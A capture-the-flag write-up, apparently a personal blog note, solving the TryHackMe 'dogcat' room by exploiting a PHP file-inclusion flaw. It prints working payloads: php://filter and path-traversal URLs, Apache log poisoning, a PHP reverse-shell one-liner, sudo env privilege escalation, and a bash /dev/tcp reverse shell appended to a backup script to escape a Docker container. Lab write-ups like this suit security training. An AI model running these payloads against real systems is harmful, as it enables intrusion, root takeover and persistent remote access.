---
title: dogcat
draft: false
date:
subiect:
dificultate: 4
amuca: true
link:
  - https://tryhackme.com/room/dogcat
tags:
  - cyberStuff
lastmod: 2026-10-09T12:45:33.615Z
---
Scanning:\
Nothing interesting, just SSH and HTTP.

Accessing the website we see this, OK cool:\
![](/images/static/Pasted%20image%2020260224063123.png)\
If we press dog, for example, a picture of a dog will be shown. OK cool, but look at the URL; I think this site is vulnerable to directory traversal:\
![](/images/static/Pasted%20image%2020260224063139.png)\
OK cool, it is! Now it's time to craft the payload:\
![](/images/static/Pasted%20image%2020260224063107.png)\
OK, interesting. Let's also look inside the source code:\
![](/images/static/Pasted%20image%2020260224064157.png)\
OK cool, let's use something from https://swisskyrepo.github.io/PayloadsAllTheThings/File%20Inclusion:

And we found this:

```
php://filter/convert.base64-encode/resource=index.php
```

We just have to append this to our current URL.\
Modified to our needs, it will be:

```
php://filter/convert.base64-encode/resource=./cat../../index
```

And we get this:\
![](/images/static/Pasted%20image%2020260224064949.png)\
Decoding that gives us the PHP source code of the page:

```
<!DOCTYPE HTML>
<html>

<head>
    <title>dogcat</title>
    <link rel="stylesheet" type="text/css" href="/style.css">
</head>

<body>
    <h1>dogcat</h1>
    <i>a gallery of various dogs or cats</i>

    <div>
        <h2>What would you like to see?</h2>
        <a href="/?view=dog"><button id="dog">A dog</button></a> <a href="/?view=cat"><button id="cat">A cat</button></a><br>
        <?php
            function containsStr($str, $substr) {
                return strpos($str, $substr) !== false;
            }
	    $ext = isset($_GET["ext"]) ? $_GET["ext"] : '.php';
            if(isset($_GET['view'])) {
                if(containsStr($_GET['view'], 'dog') || containsStr($_GET['view'], 'cat')) {
                    echo 'Here you go!';
                    include $_GET['view'] . $ext;
                } else {
                    echo 'Sorry, only dogs or cats are allowed.';
                }
            }
        ?>
    </div>
</body>

</html>
```

OK cool, based on that PHP code we see that we have to declare our extension parameter for directory traversal to work via the `ext` variable:\
![](/images/static/Pasted%20image%2020260224065538.png)\
And just like that, with the payload:

```
http://10.114.188.64/?view=./dog../../../../../../../../../../etc/passwd&ext=
```

passwd file:

```
sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin _apt:x:100:65534::/nonexistent:/usr/sbin/nologin
```

OK cool, let's try a log poisoning attack.\
A log poisoning attack is an attack where we introduce malicious PHP code into a log file, and then when we load the log file via directory traversal (LFI), the code gets executed.

We're going to use this from PayloadsAllTheThings:\
![](/images/static/Pasted%20image%2020260224070913.png)\
More exactly:

```
http://example.com/index.php?page=/var/log/apache/access.log
```

But we're going to have to use the path for Apache2:\
![](/images/static/Pasted%20image%2020260224071105.png)\
OK cool, pretty messy but cool:

```
view=./dog../../../../../../../../../../var/log/apache2/access.log&ext=
```

The payload in case you need it:

Let's send it to Burp Suite.

To configure it without FoxyProxy, we can go to Firefox settings, search for 'proxy', and configure manual proxy settings as below:

![](/images/static/Pasted%20image%2020260224071333.png)

Turn intercept on in the Proxy tab and we catch the request:\
![](/images/static/Pasted%20image%2020260224071425.png)\
Right-click on it and send it to Repeater:\
![](/images/static/Pasted%20image%2020260224071628.png)\
And now we see cleaner formatted text, cool.

Looking more closely, this is what we are going to exploit:\
![](/images/static/Pasted%20image%2020260224072926.png)\
Using a custom GET parameter, I modified the request as follows:\
![](/images/static/Pasted%20image%2020260224073442.png)\
And got the following:

![](/images/static/Pasted%20image%2020260224073420.png)\
Cool, we can see that we are `www-data`.

So now that we have remote code execution we can get a reverse shell. We know that the system has PHP installed, so I tried the following command:

```bash
php -r '$sock=fsockopen("YOUr_IP",PORT);exec("/bin/sh -i <&3 >&3 2>&3");'
```

Just replace the `cmd` parameter with that payload, then select the value and URL-encode it (Convert selection -> URL -> URL encode).

Also start netcat on your desired port:\
And bam, we have a reverse shell:\
![](/images/static/Pasted%20image%2020260224075037.png)\
Cool, let's look around:\
![](/images/static/Pasted%20image%2020260224075329.png)\
And we found the first flag!\
I upgraded the shell with:

```sh
SHELL=/bin/bash script -q /dev/null
```

![](/images/static/Pasted%20image%2020260224075510.png)\
OK cool, now let's try to privesc:\
![](/images/static/Pasted%20image%2020260224075930.png)\
And boom, easy. What I did here was run `sudo -l` to see what we can run as root.\
We found that we can run `env` as root. I searched on GTFOBins and found that `sudo env /bin/sh -p` gives us root access. And boom, now let's find the flags:\
Found flag 2:\
![](/images/static/Pasted%20image%2020260224080546.png)

But if we are already root and can't find flag 4, where could it be? That might mean we are inside a Docker container. Let's check using:

```bash
cat /proc/1/cgroup 
```

![](/images/static/Pasted%20image%2020260224080740.png)\
And we are, cool.

OK, let's look inside `/opt`:\
![](/images/static/Pasted%20image%2020260224081750.png)\
Cool, and we can find a `backup.sh` script. Let's modify it with yet another reverse shell:

I appended the following to `backup.sh`:

```bash
#!/bin/bash
bash -i >& /dev/tcp/192.168.146.225/53  0>&1
```

Start netcat to listen on our machine, and shortly after we get another shell (on the host system). And boom, the 4th flag is here:\
![](/images/static/Pasted%20image%2020260224081640.png)\
Very cool room.
